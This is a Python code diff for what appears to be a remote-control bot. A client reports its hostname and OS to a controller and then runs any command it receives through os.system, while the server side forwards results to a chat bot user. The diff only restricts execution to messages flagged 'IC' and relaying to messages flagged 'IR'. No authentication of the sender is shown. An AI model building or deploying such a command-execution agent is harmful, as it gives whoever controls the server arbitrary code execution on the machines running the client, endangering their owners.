@@ -10,7 +10,7 @@ if ROLE == "Server":
     subprocess.Popen(["python3", "Server/main.py"])
     while True:
         receive, flag = twm.receive()
-        bot.send_message(MAIN_USER_ID, f"Flag:{flag}, Receive:{str(receive)}")
+        bot.send_message(MAIN_USER_ID, f"Flag:{flag}, Receive:{str(receive)}") if flag == "IR" else None
         time.sleep(3.5)
         
          
@@ -19,5 +19,5 @@ else:
     twm.send(twm.compileCommand("IND", {"name": socket.gethostname(), "os": platform.platform()}), "0.0.0", "IND", "Hi Server! Can you give me an address?")
     while True:
         receive, flag = twm.receive()
-        os.system(receive)
+        os.system(str(receive)) if flag == "IC" else None
         time.sleep(3.5)
